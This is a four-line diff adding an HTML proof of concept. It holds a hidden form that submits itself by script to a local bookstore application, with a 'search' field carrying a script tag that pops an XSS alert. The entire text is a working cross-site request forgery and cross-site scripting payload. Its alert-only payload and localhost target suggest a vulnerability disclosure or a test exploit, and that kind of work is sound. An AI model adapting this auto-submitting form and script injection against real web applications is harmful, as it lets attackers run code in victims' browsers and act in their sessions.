@@ -1,0 +1,4 @@
+<form name="x" action="http://localhost/bookstore/" method="post">
+<input type="hidden" name='search' value='<script>alert(/XSS/)</script>'>
+</form>
+<script>document.x.submit();</script>
